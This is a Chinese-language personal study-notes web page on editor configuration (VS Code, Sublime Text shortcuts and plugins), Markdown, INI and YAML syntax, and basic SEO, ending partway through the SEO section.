<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>system</title>
<link href="vendors/public.css" rel="stylesheet" type="text/css">
<style type="text/css">
.fuhao_text{ color: #666; }
</style>
</head>
<body>
<h1>system</h1>

<main>
<nav>
  <ul>
    <li class="home">
      <a href="#" onclick="location = location.hostname == 'localhost' ? '../' : './';return false;">STUDY</a>
    </li>
    <li class="it"><a href="javascript:;">system</a></li>
  </ul>
</nav>

<div id="sys"><pre>
操作系统(Operation System,简称OS)是管理计算机硬件与软件资源的程序,是计算机系统的内核与基石;
操作系统本质上是运行在计算机上的软件程序 ;
为用户提供一个与系统交互的操作界面 ;
操作系统分内核与外壳,可以把外壳理解成围绕着内核的应用程序,而内核就是能操作硬件的程序

GUI:图形用户界面,图形用户接口(Graphical User Interface),是指采用图形方式显示的计算机操作用户界面

BIOS(Basic Input Output System)

ODBC(数据源)是一种应用程序编程接口API,连接到某个数据源(如一个MS Access数据库),只要ODBC连接是可用的就可以连接到网络中的任何计算机上的任何数据库
数据源名(DSN)
(IIS)

</pre>
</div>

<div id="sublime">
<h3>vscode</h3><pre>
替换选中区域的文本
1.control+f 输入你要替换的文本
2.光标选中你要替换的区域
3.点击查找替换栏x这边的三
4.替换

"editor.tabSize": 2,
"editor.insertSpaces": true, 
"editor.detectIndentation":false,
"editor.renderWhitespace": "all",
"editor.renderControlCharacters": true,
"editor.wordWrap": "on",
"editor.minimap.enabled": false,
"search.followSymlinks": false,
"workbench.editor.enablePreview": false,
"files.associations": {
    "*.cjson": "jsonc",
    "*.wxss": "css",
    "*.wxs": "javascript"
},
"emmet.includeLanguages": {
    "wxml": "html"
},
"minapp-vscode.disableAutoConfig": true,
"terminal.integrated.shell.windows": "C:\\WINDOWS\\System32\\cmd.exe",
"workbench.colorTheme": "Monokai",
"search.useGlobalIgnoreFiles": true,
"explorer.autoReveal": false,
"problems.autoReveal": false,
"php.executablePath": "E:\\wnmp\\php\\php.exe",
"html.autoClosingTags": false,
"git.autoRepositoryDetection": false,
"git.autorefresh": false

</pre>

<h3>sublime</h3><pre><pre>
ubuntu下载安装sublime
wget https://download.sublimetext.com/sublime-text_build-3126_amd64.deb
sudo dpkg -i sublime-text_build-3126_amd64.deb

编辑器就是纯粹编辑文本的编辑器,编辑器的本质是可以写字符就行,像windows自带的写字板就是最简单的编辑器,他的识别级别在文字级,只显示你想写入和打开的文本内容,不管写什么内容,只提供接收与显示功能。

IDE是带有软件开发功能的"集成开发环境",IDE里面除了编辑器还有很多其他东西,IDE是集合了sdk、语言支持包、函数库、编辑器在一起的软件或集合
可以支持特定编程语言,识别级别比编辑器高一级,可识别编程语言或者这种语言的库,往往用起来更方便更专业
集成开发环境(IDE,Integrated Development Environment)是用于提供程序开发环境的应用程序,一般包括代码编辑器、编译器、调试器和图形用户界面等工具。集成了代码编写、分析、编译、调试功能等一体化的开发软件服务套。所有具备这一特性的软件或软件套组都可以叫集成开发环境。如微软的Visual Studio系列,Borland的C++ Builder、Delphi系列等。该程序可以独立运行,也可以和其它程序并用
IDE多被用于开发HTML应用软件。例如许多人在设计网站时使用IDE如HomeSite、DreamWeaver等,因为很多项任务会自动生成

【 快捷键 】
菜单栏隐藏之后显示菜单栏,按住Alt键菜单栏即会出现,松开后则菜单栏就会消失

重新打开关闭的标签
和Chrome浏览器一样,Shift+Ctrl+T就可以重新打开之前关闭页面,连续按这样的组合键就可以按照关闭的顺序重新打开它们

在函数、类上面/** + tab即可生成多行注释
sublime tex注释插件DocBlockr可以生成js、php等语言函数注释,只需要在函数上面输入/**,然后按tab就会自动生成注释

矩形(垂直)选区;
鼠标中键拖动或者按住shift右键拖动或纯键盘Ctrl + Alt + Down,然后shift+→

分成两屏
shift + alt + 2

【 vi编辑器模式 】
sublime支持原始的vi编辑器模式,默认的配置中是不开启vi支持的

开启sublime的vi模式
在菜单栏中: Preferences -> Setting - User即可打开配置文件进行编辑,将ignored_packages项的[]里面"Vintage"内容//注释掉或删除掉
再按Esc退出编辑模式,即进入了Vi模式。

工作模式:
任意模式下按Esc键进入 命令模式(command mode)——是用来编辑文本,如上下翻页等、复制粘贴、跳转到指定行等操作。
再按a键进入编辑(插入)模式(insert mode)——是用来编写文本内容的

</pre><textarea>//写一个函数或者类的注释
/**
*@author  作者   [name] <[< email address>]>
*@param  参数 格式为  {String} 参数描述 [type] $[name] [< description>]
*@example  例子  [URI] [< description>]
*@link  链接   格式(target, link)
*@namespace
*@requires
*@return  返回值  [type] [< description>]
*@version  版本 [< vector>] [< description>] 格式1.1
**/

</textarea><pre>
【 选择类 】
Ctrl+D           选中光标所占的文本,继续操作则会选中下一个相同的文本
Alt+F3           选中文本按下快捷键可一次性选择全部相同文本进行编辑,如快速选中并更改所有相同的变量名、函数名等
Ctrl+L           选中整行,继续操作则继续选择下一行,效果同Shift+↓
Ctrl+Shift+L     先选中多行,再按下快捷键,会在每行行尾插入光标,即可同时编辑这些行
Ctrl+M           光标移动至括号内结束或开始的位置
Ctrl+Shift+M     选择括号内的内容(继续选择父括号),如快速选中删除函数中的代码,重写函数体代码或重写括号内里的内容
Ctrl+Enter       在下一行插入新行,光标不在行尾也能快速向下插入一行
Ctrl+Shift+Enter 在上一行插入新行,光标不在行首也能快速向上插入一行
Ctrl+Shift+[     选中代码,按下快捷键,折叠代码
Ctrl+Shift+]     选中代码,按下快捷键,展开代码
Ctrl+K+0         展开所有折叠代码
Ctrl+←           向左单位性地移动光标,快速移动光标
Ctrl+→           向右单位性地移动光标,快速移动光标
shift+↑          向上选中多行
shift+↓          向下选中多行
Shift+←          向左选中文本
Shift+→          向右选中文本
Ctrl+Shift+←     向左单位性地选中文本
Ctrl+Shift+→     向右单位性地选中文本
Ctrl+Shift+↑     将光标所在行和上一行代码互换
Ctrl+Shift+↓     将光标所在行和下一行代码互换

【 编辑类 】
Ctrl+J       合并选中的多行代码为一行,如将多行格式的CSS属性合并为一行
Ctrl+Shift+D 复制光标所在整行,插入到下一行
Tab          向右缩进
Shift+Tab    向左缩进
Ctrl+K+K     删除从光标至行尾的内容
Ctrl+Shift+K 删除整行
Ctrl+/       注释单行
Ctrl+Shift+/ 注释多行
Ctrl+K+U     转换大写
Ctrl+K+L     转换小写
Ctrl+T       左右字母互换
Ctrl+Z       撤销
Ctrl+Y       恢复撤销
Ctrl+U       软撤销,感觉和Gtrl+Z一样

【 搜索类 】
Ctrl+F       打开底部搜索框,查找关键字
ctrl+H       查找替换
Ctrl+P       打开搜索框
             1、输入当前项目中的文件名,快速搜索文件
             2、输入@和关键字,查找文件中函数名
             3、输入:和数字,跳转到文件中该行代码
             4、输入#和关键字,查找变量名
Ctrl+G       搜索框,自带:,输入数字跳转到该行代码
Ctrl+R       搜索框,自带@,输入关键字查找文件中函数名或所有CSS选择器,比一般"查找"功能快
Ctrl+:      搜索框,自带#,输入关键字查找文件中的变量名、属性名等
Ctrl+Shift+P 打开命令框。如:输入关键字调用sublime text或插件的功能,如用package安装插件
Esc          退出光标多行选择,退出搜索框,命令框等

ctrl + end    转跳到文件最后一行
ctrl + A + -> 全选再右键,转跳到文件最后一行

【 显示类 】
Ctrl+Tab      按文件浏览过的顺序,切换当前窗口的标签页
Ctrl+PageDown 向左切换当前窗口的标签页
Ctrl+PageUp   向右切换当前窗口的标签页
Alt+Shift+1   窗口分屏,恢复默认1屏(非小键盘的数字)
Alt+Shift+2   左右分屏-2列
Alt+Shift+3   左右分屏-3列
Alt+Shift+4   左右分屏-4列
Alt+Shift+5   等分4屏
Alt+Shift+8   垂直分屏-2屏
Alt+Shift+9   垂直分屏-3屏
F11           全屏模式
Shift+F11     免打扰模式

</pre>setting<textarea>{
  "color_scheme": "Packages/User/SublimeLinter/Monokai (SL).tmTheme",
  "draw_white_space": "all",
  "expand_tabs_on_save": true,
  "font_face": "Consolas",
  "font_size": 12,
  "ignored_packages": [ "Vintage" ],
  "preview_on_click": false,
  "tab_size": 2,
  "theme": "Default.sublime-theme",
  "translate_tabs_to_spaces": true,
  "trim_trailing_white_space_on_save": true
}

</textarea>

<h4>通过Package Control安装插件</h4><pre>
安装过Package Control后可直接使用快捷键ctrl+shift+p,输入框输入install package,点击或按Enter选择Package Control: Install Package,操作成功后在输入框中输入插件的名称,然后选择插件就会在后台自动安装,有的插件安装完成后需要重新启动一下sublime,建议安装任何插件后都重新启动一下

手工安装
进入网站packagecontrol.io在Search处输入插件名如emmet,然后点击搜索、点击箭头处进入想要安装的插件的详细界面,一般都会写明该插件的安装方法,下载该插件到特定的文件夹中
1. 在Sublime菜单栏中点击Preferences > Browse Packages
2. 将下载的文件解压到该目录。

解决Sublime无法下载插件的问题
在Preferences > Package Settings > Package Control > Settings - User页面上配置Json即可代码
"channels":["https://erhan.in/channel_v3.json"],

【 在sublime上装了Emmet插件快速编写代码 】
1、自动生成html头文件
html:5 或!:用于HTML5文档类型
html:xt:用于XHTML过渡文档类型
html:4s:用于HTML4严格文档类型
例如输入 html:5 然后按下Tab键,就会自动将html头文件补全

2、快速填加类、id
连续输入元素名称和ID,Emmet会自动补全,比如输入p#example按下Tab键就会得到id="example"的p元素
输入div.cls#con按下Tab键得到class="cls" id="con"的div元素

3、定义多个元素
例如输入 ul>li*3 会得到包含3个li元素的ul元素

4、嵌套
现在你只需要1行代码就可以实现标签的嵌套。
>:子元素符号,表示嵌套的元素
+:同级标签符号
^:可以使该符号前的标签提升一行
例如输入 div#con>div得到被id="con"的div元素嵌套的div元素

5、嵌套定义多个带class或id的元素
例如: ul.d1>li#d2$*3 会得到被id="d1"的div元素嵌套的3个id="d21" id="d22" id="d23"div元素

【 css快捷 】
1)w100 -> width: 100px;

2)渐变
输入lg(left, #fff 50%, #000)

3)@f
@font-face {
  font-family:;
  src:url();
}

4)模糊匹配
ov:h、ov-h、ovh和oh

5)供应商前缀
前缀缩写如下:
w 表示 -webkit-
m 表示 -moz-
s 表示 -ms-
o 表示 -o-

如果输入非W3C标准的CSS属性,Emmet会自动加上供应商前缀,比如输入trs,则会生成:
-webkit-transiton: ;
-moz-transition: ;
-ms-transiton: ;
-o-transition: ;
transition: ;

如果不希望加上所有前缀,可以使用缩写来指定,如-wm-trf表示只加-webkit和-moz前缀:
-webkit-transform: ;
-moz-transform: ;
transform: ;

【 推荐插件 】
安装Package Control
按Ctrl+`调出console
粘贴安装代码到底部命令行并回车
重启Sublime
如果在Perferences->package settings中看到package control这一项则安装成功。
可以到官网链接下载Package Control.sublime-package放到sublime安装目录里的data里installed package文件夹

安装插件Cmd Caller在当前目录打开cmd或其他程序比如bash
1、ctrl+shift+p打开Package Control: Install Package,搜索cmd caller并安装。
2、配置,依次点击:preferences->Package Settings->Cmd Caller->Settings
{
  "windows": {
    "default": "CMD",
    "apps":{
      "CMD": {
      "name": "Run cmd.exe Here",
      "cmd": "cmd.exe /s /k pushd \"${file_path}\""
    }
  }
  }
}

3、添加快捷键,可设置ctrl+shift+c,可以按需更改,依次点击:Preferences->Key Blindings
[
  {
    "keys": ["ctrl+shift+c"],
    "command": "cmd_caller_default"   // 打开默认的程序
  },
  {
    "keys": ["ctrl+shift+,"],
    "command": "cmd_caller_list"      // 显示程序列表
  }
]

使用小插件ClickableURLs可以让文件中的URL能够点击

同步选项
如果在多台计算机上工作,同步选项设置应该是一个好主意,借用Dropbox完成这一任务

拼写检查
如果经常使用Sublime从事英文创作,那么启用拼写检查就非常有用处了。选择Preferences > Settings – User菜单,添加以下代码:"spell_check": true,

跨文件编辑
同一个编辑操作可以在多个文件中同时重复。如多个文件中有同一段代码时:
按ctrl+Shift+F在Find框中输入待查找的代码。可按ctrl+E快速使用选择中的代码段。
在Where框中指定需要查找的文件范围,或填写表示查找目前打开的文件。
在Replace框中输入要替换成的代码,按Replace按钮批量替换。

sublime中安装编译sass的插件SASS build system for Sublime Text 2
首先要安装Ruby和Sass,详细可参考:http://www.w3cplus.com/sassguide/install.html,安装Sass的时候可能被墙不一定安装得上,所以可以退而求其次安装测试本版--pre。
详见:https://packagecontrol.io/installation#st3

</pre>
</div>

<div id="configfile">
<h4>.md文件　html加载md格式内容,file:///引发同源策略,所以必须开启服务器才可加载md文件</h4><textarea>＜div id="content"＞＜/div＞
＜div id="content1"＞＜/div＞

＜script src="https://cdn.jsdelivr.net/npm/marked/marked.min.js"＞＜/script＞
＜script src="vendors/jquery-3.3.1.min.js"＞＜/script＞
＜script＞
  document.querySelector('#content').innerHTML = marked('# Marked in the browser\n\nRendered by **marked**.');

  $.get('database.md', function(data,status){
    console.log(status)
    if(status=='success') document.getElementById('content1').innerHTML = marked(data);
});
＜/script＞

</textarea>

<h4>.md文件格式 <a href="http://mahua.jser.me/">在线</a></h4><pre>
Markdown是一种轻量级的纯文本格式的标记语言,通过简单的标记语法可以使普通文本内容具有一定的格式,可转换成格式丰富的HTML页面,Markdown文件的后缀名便是“.md”
markdown支持html语言,markdown中可以加html标签

优点：
1、因为是纯文本,所以只要支持Markdown的地方都能获得一样的编辑效果,可以让作者摆脱排版的困扰,专心写作。
2、操作简单,Markdown编辑时标记个标题只需要在标题内容前加#即可

sublime实现markdown浏览器预览
sublime安装插件OmniMarkupPreviewer之后按'ctrl + Alt + O'即可在浏览器内预览当前打开的md文件

Markdown增强版中比较有名的有Markdown Extra、MultiMarkdown、 Maruku等。这些衍生版本要么基于工具,如~~Pandoc~~,Pandao;要么基于网站,如GitHub和Wikipedia,在语法上基本兼容,但在一些语法和渲染效果上有改动

</pre><textarea>标题(fontsize desc)
#<空格>一级标题
##<空格>二级标题
###<空格>三级标题
######<空格>六级标题

一级标题
======

二级标题
------

字体
*斜体文字*
_斜体文字_
**加粗文字**
__加粗文字__
***斜体加粗文字***
~~加删除线的文字~~

上标：X< sub>2< /sub>
下标：O< sup>2< /sup>

开始第一段。。。写完第一段。
<空行>
开始第二段。。。写完第二段。

开始第一段。。。准备换行。<空格><空格>
另起一行。。。

分割线
三个及以上的-或*都可以
---
----
- - -
---------------------------------------
***
*****

特殊符号
(1)对于Markdown中的语法符号,前面加反斜线\即可显示符号本身
\\
\*
\{\} \[\] \(\)
\#
\+
\-
\.
\!

特殊字符
&# 10084; 爱
&# 10003; 勾
&# 9728;  日
&# 9733;  五角星
&# 9730;  伞
&# 10052; 雪花
&# 9835;  音乐

引用 Blockquotes
> 引用文本 Blockquotes
引用的行内混合 Blockquotes
> 引用：如果想要插入空白换行`即< br />标签`,在插入处先键入两个以上的空格然后回车即可,[普通链接](https://www.mdeditor.com/)。

在引用的文字前加>即可,引用也可以嵌套,如加两个>>三个>>>
>这是引用的内容
>>这是引用的内容
>>>>>>>>>>这是引用的内容

><空格>某某大牛曾经说。。。<空格><空格>
某某大牛又说。。。

引用中的引用效果
> 某A大牛曾经说。。。
>
> > 某B大牛曾经说。。。
>
> 某A大牛接着说。。。

锚点与链接 Links
在markdown中将链接地址或邮箱地址用<>包围,则会被自动转换成可点击的链接。
< http://haoeric.com>
< haoeric0520@gmail.com>
直接链接：< https://www.mdeditor.com>
[普通链接](https://www.mdeditor.com/)
[普通链接带标题](https://www.mdeditor.com/ "普通链接带标题title,鼠标悬浮此处显示的标题")
[这个](/about/)链接是本地资源。

[锚点链接][anchor-id]
这是一个引用链接的[例子][id]。
[id]: http://example.com/  "鼠标悬浮标题(可选)"
[anchor-id]: https://www.mdeditor.com/

[mailto:test.test@gmail.com](mailto:test.test@gmail.com)
GFM a-tail link @pandao
邮箱地址自动链接 test.test@gmail.com  www@vip.qq.com

我常用的网站包括[Google][1],[Yahoo][2]和[MSN][3]。
[1]: http://google.com/        "Google"
[2]: http://search.yahoo.com/  "Yahoo Search"
[3]: http://search.msn.com/    "MSN Search"

## 也可以写成
我常用的网站包括[Google][],[Yahoo][]和[MSN][]。
[google]: http://google.com/        "Google"
[yahoo]:  http://search.yahoo.com/  "Yahoo Search"
[msn]:    http://search.msn.com/    "MSN Search"

图片加链接 (Image + Link)：
插入图片和插入链接非常类似,只是在方括号前多一个!
![图片alt](图片地址 ''图片title'')
图片alt就是显示在图片下面的文字,相当于对图片内容的解释。
图片title是图片的标题,当鼠标移到图片上时显示的内容,title可加可不加
![blockchain](https://ss0.bdstatic.com/70cF6hhy/it/u=702257389,1274025419&fm=27&gp=0.jpg "区块链")
![](https://img.shields.io/badge/language-php-orange.svg)
[![](https://www.mdeditor.com/images//markdown.png)](https://www.mdeditor.com/images//markdown.png "markdown")

角标
不同于链接,这里的角标内容会被放在文末,点击可以实现跳转。

请参阅脚注1. [^1]

[^1]: 脚注1内容。

请参阅脚注2. [^2]

[^2]: 脚注2内容。


列表嵌套
上一级和下一级之间敲三个空格即可

无序列表可以使用*,+,-三者中任意符号来标记;有序列表则使用数字加.来标记。注意标记后面需要加上一个空格,有序列表的数字会被按顺序自动更正。

- 列表内容
+ 列表内容
* 列表内容

*<空格>红红红红红
*<空格>绿绿绿绿绿
*<空格>蓝蓝蓝蓝蓝

+<空格>红红红红红
+<空格>绿绿绿绿绿
+<空格>蓝蓝蓝蓝蓝

-<空格>红红红红红
-<空格>绿绿绿绿绿
-<空格>蓝蓝蓝蓝蓝

- 列表一
- 列表二
- 列表三

* 列表一
* 列表二
* 列表三

加号和嵌套
+ 列表一
+ 列表二
    + 列表二-1
    + 列表二-2
    + 列表二-3
+ 列表三
    * 列表一
    * 列表二
    * 列表三

有序列表 Ordered Lists

1.<空格>红红红红红
2.<空格>绿绿绿绿绿
3.<空格>蓝蓝蓝蓝蓝

2.<空格>红红红红红
3.<空格>绿绿绿绿绿
1.<空格>蓝蓝蓝蓝蓝

1. 第一行
2. 第二行
3. 第三行

如果列表中的一项有多个段落,新的段落需要缩进4个空格或1个tab。
* 项目一,段落一
<空行>
<空格><空格><空格><空格>项目一,段落二

* 项目二,段落一
<空行>
<空格><空格><空格><空格>项目二,段落二

GFM task list(多选框列表)
- [x] GFM task list 1(默认选中且不可修改)
- [x] GFM task list 2
- [ ] GFM task list 3
    - [ ] GFM task list 3-1
    - [ ] GFM task list 3-2
    - [ ] GFM task list 3-3
- [ ] GFM task list 4
    - [ ] GFM task list 4-1
    - [ ] GFM task list 4-2

绘制表格Tables
第二行分割表头和内容。
- 有一个就行,为了对齐,多加了几个
文字默认居左
-两边加：表示文字居中
-右边加：表示文字居右
原生的语法两边都要用 | 包起来,可省略

表头|表头|表头
---|:--:|---:
内容|内容|内容
内容|内容|内容

姓名|技能|排行
--|:--:|--:
刘备|哭|大哥
关羽|打|二哥
张飞|骂|三弟

First Header  | Second Header
------------- | -------------
Content Cell  | Content Cell
Content Cell  | Content Cell

| Function name | Description                    |
| ------------- | ------------------------------ |
| `help()`      | Display the help window.       |
| `destroy()`   | **Destroy your computer!**     |

| Left-Aligned  || Left-Aligned  | Center Aligned  | Right Aligned |
|  ------------ || :------------ |:---------------:| -----:|
| col 3 is      || col 3 is      | some wordy text | $1600 |
| col 2 is      || col 2 is      | centered        |   $12 |
| zebra stripes || zebra stripes | are neat        |    $1 |

多语言代码高亮 Codes
单行代码、行内代码 Inline code：代码之间分别用一个反引号包起来,很多字符是需要使用反斜杠\进行转义,常用于突出重点
执行命令：`npm install marked`
`create database hero;`

可以使用函数`print()`打印输出。
如果代码中需要加入反引号`号,则使用两个``加空格来包裹
这里就是一个反引号`` ` ``。
在代码里也可以保留反引号`` `print()` ``。

缩进风格
即缩进四个空格,也做为实现类似 `< pre>` 预格式化文本 ( Preformatted Text ) 的功能。
markdown中插入一整段代码快也非常方便,只需要将代码块的每一行缩进4个空格或一个tab

代码如下:

<空格><空格><空格><空格>cat("hello world")
<空格><空格><空格><空格>cat("welcome to learn markdown")

    <?php
        echo "Hello world!";
    ?>

代码块：使用四个空格缩进表示代码块,一些IDE支持行数提示和着色,一般代码之间分别用三个反引号包起来,且两边的反引号单独占一行
```python
print('hello nick')
```

```javascript
function test() {
  console.log("Hello world!");
}
```

```html
< h1 class="text-xxl">Hello world!< /h1>
< p class="text-green">Plain text< /p>
```

~~~
www  WEB部署目录
├─application           应用目录
│  ├─module_name        模块目录
│  │  ├─config.php      模块配置文件
│  │  ├─controller      控制器目录
│  │  ├─model           模型目录
│  │  ├─view            视图目录
│  │  └─ ...            更多类库目录
│  │
│  ├─command.php        命令行工具配置文件
│  ├─config.php         公共配置文件
│  └─database.php       数据库配置文件
│
├─public                WEB目录(对外访问目录)
│  ├─index.php          入口文件
│  ├─router.php         快速测试文件
│  └─.htaccess          用于apache的重写
│
├─thinkphp              框架系统目录
├─vendor                第三方类库目录(Composer依赖库)
├─composer.json         composer 定义文件
├─README.md             README 文件
├─think                 命令行入口文件
~~~

流程图
主要的语法为 name=>type: describe,其中type主要有以下几种：
1.开始和结束：start end
2.输入输出：inputoutput
3.操作：operation
4.条件：condition
5.子程序：subroutine

```flow
st=>start: Start:>https://www.zybuluo.com
io=>inputoutput: verification
op=>operation: Your Operation
cnd=>condition: Yes or No?
sub=>subroutine: Your Subroutine
e=>end

st->io->op->cond
cond(yes)->e
cond(no)->sub->io
```

绘制流程图 Flowchart
```flow
st=>start: 用户登陆
op=>operation: 登陆操作
cond=>condition: 登陆成功 Yes or No?
e=>end: 进入后台

st->op->cond
cond(yes)->e
cond(no)->op
``

绘制序列图 Sequence Diagram
```seq
Andrew->China: Says Hello
Note right of China: China thinks\nabout it
China-->Andrew: How are you?
Andrew->>China: I am good thanks!
```

科学公式 TeX(KaTeX)
$$E=mc^2$$

行内的公式$$E=mc^2$$行内的公式,行内的$$E=mc^2$$公式。
$$x > y$$
$$\(\sqrt{3x-1}+(1+x)^2\)$$
$$\sin(\alpha)^{\theta}=\sum_{i=0}^{n}(x^i + \cos(f))$$

多行公式：

```math
\displaystyle
\left( \sum\_{k=1}^n a\_k b\_k \right)^2
\leq
\left( \sum\_{k=1}^n a\_k^2 \right)
\left( \sum\_{k=1}^n b\_k^2 \right)
```

```katex
\displaystyle
    \frac{1}{
        \Bigl(\sqrt{\phi \sqrt{5}}-\phi\Bigr) e^{
        \frac25 \pi}} = 1+\frac{e^{-2\pi}} {1+\frac{e^{-4\pi}} {
        1+\frac{e^{-6\pi}}
        {1+\frac{e^{-8\pi}}
         {1+\cdots} }
        }
    }
```

```latex
f(x) = \int_{-\infty}^\infty
    \hat f(\xi)\,e^{2 \pi i \xi x}
    \,d\xi
```

### End

</textarea>

<h4>.ini文件</h4><pre>
.ini 是Initialization File的缩写,即初始化文件,ini文件格式广泛用于软件的配置文件。
在程序中经常要用到设置或其他少量数据的存盘,以便程序在下一次执行的时候可以使用,比如说保存本次程序执行时窗口的位置、大小、一些用户设置的数据等

INI file的后缀名也不一定是".ini",也可以是".cfg",".conf"或".txt"

INI文件是文本文件,格式很简单,最基本的三个要素是:parameters,sections节和comments注释
[Section1 Name]
KeyName1=value1
KeyName2=value2
...
[Section2 Name]
KeyName1=value1
KeyName2=value2

ini文件可以分为几个Section,每个Section的名称用[]括起来
所有的parameters都是以sections为单位结合在一起的,所有的section名称都是独占一行,并且sections名字都被方括号包围。在section声明后的所有parameters都是属于该section。对于一个section没有明显的结束标志符,一个section的开始就是上一个section的结束,或者是end of the file。Sections一般情况下不能被nested,当然特殊情况下也可以实现sections的嵌套。
[section]

在一个Section中,可以有很多的Key,每一个Key可以有一个值并占用一行,格式是Key=value
INI最基本的元素就是parameter,每一个parameter都有一个name和一个value,name和value是由等号"="隔开
name = value

在INI文件中注释语句是以分号";"开始的。所有的注释语句不管多长都是独占一行直到结束的。在分号和行结束符之间的所有内容都是被忽略的。
;comments text

Win32对ini文件操作的api中,有一部分是对win.ini操作的,有一部分是对用户自定义的ini文件操作的
Win.in 和 system.ini是Windows的两个非常重要的初始化文件,Windows将用户所作的选择以及各种变化的系统信息记录在这两个文件中。System.ini 描述了系统硬件的当前状态,Win.ini 文件则包含了Windows 系统运行环境的当前配置

</pre>

<h4>.yml格式</h4><pre>
YAML是专门用来写配置文件的语言,非常简洁和强大,远比JSON格式方便。
YAML语言(发音 /ˈjæməl/ )的设计目标,就是方便人类读写,实质上是一种通用的数据串行化格式。

基本语法规则如下:
大小写敏感
使用缩进表示层级关系
缩进时不允许使用Tab键,只允许使用空格。
缩进的空格数目不重要,只要相同层级的元素左侧对齐即可
# 表示注释,从这个字符一直到行尾都会被解析器忽略。

YAML支持的数据结构有三种
对象:键值对的集合,又称为映射(mapping)/ 哈希(hashes) / 字典(dictionary)
数组:一组按次序排列的值,又称为序列(sequence) / 列表(list)
纯量(scalars):单个的、不可再分的值

【 对象 】
对象的一组键值对,使用冒号结构表示。
animal: pets 转为JavaScript: { animal: 'pets' }
Yaml也允许另一种写法将所有键值对写成一个行内对象。
hash: { name: Steve, foo: bar } 转为JavaScript: { hash: { name: 'Steve', foo: 'bar' } }

【 数组 】
一组连词线开头的行,构成一个数组。
- Cat
- Dog
- Goldfish
转为JavaScript
[ 'Cat', 'Dog', 'Goldfish' ]

数据结构的子成员是一个数组则可以在该项下面缩进一个空格。
-
 - Cat
 - Dog
 - Goldfish
转为JavaScript
[ [ 'Cat', 'Dog', 'Goldfish' ] ]

数组也可以采用行内表示法
animal: [Cat, Dog]
转为JavaScript
{ animal: [ 'Cat', 'Dog' ] }

【 纯量 】
纯量是最基本的、不可再分的值,以下数据类型都属于JavaScript的纯量。
字符串、布尔值、整数、浮点数、Null、时间、日期

number: 12.30  数值直接以字面量的形式表示
isSet: true  布尔值用true和false表示
parent: ~  null用~表示
iso8601: 2001-12-14t21:59:43.10-05:00  时间采用ISO8601格式
date: 1976-07-31  日期采用复合iso8601格式的年、月、日表示
e: !!str 123  YAML允许使用两个感叹号,强制转换数据类型
f: !!str true

【 字符串 】
字符串是最常见、最复杂的一种数据类型。
字符串默认不使用引号表示
str: 这是一行字符串
转为JavaScript
{ str: '这是一行字符串' }

如果字符串之中包含空格或特殊字符则需要放在引号之中
str: '内容: 字符串'
转为JavaScript
{ str: '内容: 字符串' }

单引号和双引号都可以使用,双引号不会对特殊字符转义
s1: '内容\n字符串'
s2: "内容\n字符串"
转为 JavaScript 如下。
{ s1: '内容\\n字符串', s2: '内容\n字符串' }

单引号之中如果还有单引号,必须连续使用两个单引号转义
str: 'labor''s day'
转为JavaScript
{ str: 'labor\'s day' }

字符串可以写成多行,从第二行开始,必须有一个单空格缩进。换行符会被转为空格
str: 这是一段
  多行
  字符串
转为JavaScript
{ str: '这是一段 多行 字符串' }

多行字符串可以使用|保留换行符,也可以使用>折叠换行
this: |
  Foo
  Bar
that: >
  Foo
  Bar
转为JavaScript
{ this: 'Foo\nBar\n', that: 'Foo Bar\n' }

+表示保留文字块末尾的换行,-表示删除字符串末尾的换行
s1: |
  Foo

s2: |+
  Foo

s3: |-
  Foo
转为JavaScript
{ s1: 'Foo\n', s2: 'Foo\n\n\n', s3: 'Foo' }

字符串之中可以插入HTML标记。
message: |
  < p style="color: red">
    段落
  </ p>
转为JavaScript
{ message: '\n< p style="color: red">\n  段落\n</ p>\n' }

【 引用 】
锚点&和别名*,可以用来引用。

defaults: &defaults
  adapter:  postgres
  host:     localhost

development:
  database: myapp_development
  <<\: *defaults              # 去掉\

test:
  database: myapp_test
  <<\: *defaults              # 去掉\

等同于下面的代码
defaults:
  adapter:  postgres
  host:     localhost

development:
  database: myapp_development
  adapter:  postgres
  host:     localhost

test:
  database: myapp_test
  adapter:  postgres
  host:     localhost

&用来建立锚点(defaults),<< 表示合并到当前数据,*用来引用锚点。
- &showell Steve
- Clark
- Brian
- Oren
- *showell
转为JavaScript
[ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]

【 函数和正则表达式的转换 】
这是 JS-YAML 库特有的功能,可以把函数和正则表达式转为字符串。

# example.yml
fn: function() { return 1 }
reg: /test/

解析上面的yml文件的代码如下
var yaml = require('js-yaml');
var fs   = require('fs');

try {
  var doc = yaml.load(
    fs.readFileSync('./example.yml', 'utf8')
  );
  console.log(doc);
} catch(e) {
  console.log(e);
}

从JavaScript对象还原到yaml文件的代码如下
var yaml = require('js-yaml');
var fs   = require('fs');

var obj = {
  fn: function() { return 1 },
  reg: /test/
};

try {
  fs.writeFileSync(
    './example.yml',
    yaml.dump(obj),
    'utf8'
  );
} catch(e) {
  console.log(e);
}

</pre>
</div>

<div id="seo">
<h3>SEO</h3><pre>
SEO搜索引擎优化
SEM搜索引擎营销,如竞价排名

网站流量的来源:
1.外链:友情链接和推广链接
2.搜索引擎:关键词
3.直接输入地址访问

白帽、黑帽  百度站长工具、百度统计

【 搜索引擎收录 】
网页被搜索引擎蜘蛛(谷歌爬虫)爬行并保存索引,能被我们检索到时就算网页被收录了
1、使用site命令查询网站收录  site:站点域名
2、http://seo.chinaz.com
3、http://www.aizhan.com

【 提高网站收录量和权重 】
1、url提交  搜索引擎站长平台
2、抓取诊断 主动邀请蜘蛛来抓取你的内容,抓取之后给予你抓取反馈
3、站长平台安全检查、漏洞检查、添加百度分享
4、制作添加网站地图 导航地图和xml txt地图,爱站seo工具包
5、外链制作         根据长尾词提问百度知道,然后做上网站链接
6、链接交换         交换友情链接

【权重】
百度权重是爱站、站长工具等网站推出针对网站关键词排名预计给网站带来流量,划分等级0-10的第三方网站欢迎度评估数据,百度官方明确表示不承认百度权重

权重数值越大,说明网站自然流量越大,相应关键词排名相对靠前
权重、流量、关键词排名相辅相成

权重的影响因素:
1、外链推广度、数量、质量
2、内链够强大
3、网站原创质量
4、网站年龄时间
5、网站更新频率
6、网站服务器稳定、安全
7、网站流量
8、关键词排名
9、网站收录数量
10、网站浏览量及深度即用户体验

提升百度权重
1、增加权重首要抓网站内容
2、增加内页权重
3、购买或交换高质量外部链接
4、建立百度百科词条
5、发展二级域名来增加网站权重
6、域名和空间选择

【 站长平台 】
百度站长平台结构化数据插件:wordpress博客程序,discuz论坛程序

【 seo流程 】
1、关键词选定
竞争对手分析
关键词关注量分析
关键词与网站相关性分析
